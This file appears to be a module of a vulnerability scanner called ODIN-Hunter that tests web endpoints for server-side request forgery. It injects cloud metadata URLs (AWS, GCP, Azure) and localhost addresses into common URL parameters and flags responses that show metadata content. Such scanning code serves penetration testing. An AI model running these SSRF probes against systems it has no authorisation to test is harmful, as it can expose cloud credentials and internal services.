"""
ODIN-Hunter | SSRF Tester
"""
import aiohttp
import asyncio

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/", # GCP metadata
    "http://169.254.169.254/metadata/instance",            # Azure metadata
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:6379/",   # Redis
    "http://127.0.0.1:27017/",  # MongoDB
    "http://127.0.0.1:9200/",   # Elasticsearch
]

SSRF_PARAMS = ["url", "link", "src", "source", "href", "redirect", "callback",
               "return", "next", "target", "load", "fetch", "request", "uri", "endpoint"]

class SSRFTester:
    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=10)

    async def test(self, target: str, endpoints: list) -> list:
        findings = []
        base_url = f"https://{target}"

        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            for ep in endpoints:
                path = ep.get("path", "")
                url = f"{base_url}{path}"
                for param in SSRF_PARAMS:
                    for payload in SSRF_PAYLOADS[:3]:
                        try:
                            test_url = f"{url}?{param}={payload}"
                            async with session.get(test_url, ssl=False, allow_redirects=False) as resp:
                                body = await resp.text(errors="ignore")
                                # AWS metadata response indicators
                                if any(indicator in body for indicator in [
                                    "ami-id", "instance-id", "local-ipv4",
                                    "computeMetadata", "instanceId", "projectId"
                                ]):
                                    findings.append({
                                        "target": target,
                                        "type": "ssrf",
                                        "title": "Server-Side Request Forgery (SSRF)",
                                        "severity": "critical",
                                        "description": f"SSRF found at {url} via {param} param — cloud metadata accessible!",
                                        "proof": {"url": test_url, "param": param, "payload": payload, "response": body[:500]},
                                        "confidence": 0.90,
                                        "remediation": "Validate and whitelist URLs; block internal ranges"
                                    })
                        except Exception:
                            pass

        return findings
